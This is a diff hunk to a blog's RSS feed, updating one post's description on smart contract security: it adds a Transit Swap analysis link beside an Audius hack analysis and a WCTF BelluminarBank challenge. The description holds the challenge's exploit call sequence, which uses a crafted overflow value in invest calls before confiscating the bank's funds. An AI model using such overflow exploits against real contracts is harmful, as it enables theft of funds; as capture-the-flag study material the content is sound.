@@ -71,7 +71,7 @@
       <pubDate>Tue, 23 Aug 2022 00:28:00 +0800</pubDate>
       
       <guid>http://localhost:1313/post/contract_security/</guid>
-      <description>合约事故 可升级合约漏洞-Web3音乐平台Audius被黑事件分析: https://learnblockchain.cn/article/4441 WCTF BelluminarBank: https://learnblockchain.cn/article/1989 1 2 3 4 BelluminarBank.deploy(&amp;#34;123456&amp;#34;, 1, {&amp;#39;from&amp;#39;:accounts[0], &amp;#39;value&amp;#39;:10}) BelluminarBank[0].invest(1, &amp;#34;0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffe1ecc80&amp;#34;, {&amp;#39;from&amp;#39;:accounts[1], &amp;#39;value&amp;#39;: 1}) BelluminarBank[0].invest(2, 0, {&amp;#39;from&amp;#39;:accounts[1], &amp;#39;value&amp;#39;: 0}) BelluminarBank[0].confiscate(1, &amp;#34;123456&amp;#34;, {&amp;#39;from&amp;#39;:accounts[1]})</description>
+      <description>合约事故 可升级合约漏洞-Web3音乐平台Audius被黑事件分析: https://learnblockchain.cn/article/4441 Transit Swap合约分析: https://rekt.news/transit-swap-rekt/ WCTF BelluminarBank: https://learnblockchain.cn/article/1989 1 2 3 4 BelluminarBank.deploy(&amp;#34;123456&amp;#34;, 1, {&amp;#39;from&amp;#39;:accounts[0], &amp;#39;value&amp;#39;:10}) BelluminarBank[0].invest(1, &amp;#34;0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffe1ecc80&amp;#34;, {&amp;#39;from&amp;#39;:accounts[1], &amp;#39;value&amp;#39;: 1}) BelluminarBank[0].invest(2, 0, {&amp;#39;from&amp;#39;:accounts[1], &amp;#39;value&amp;#39;: 0}) BelluminarBank[0].confiscate(1, &amp;#34;123456&amp;#34;, {&amp;#39;from&amp;#39;:accounts[1]})</description>
     </item>
     
     <item>
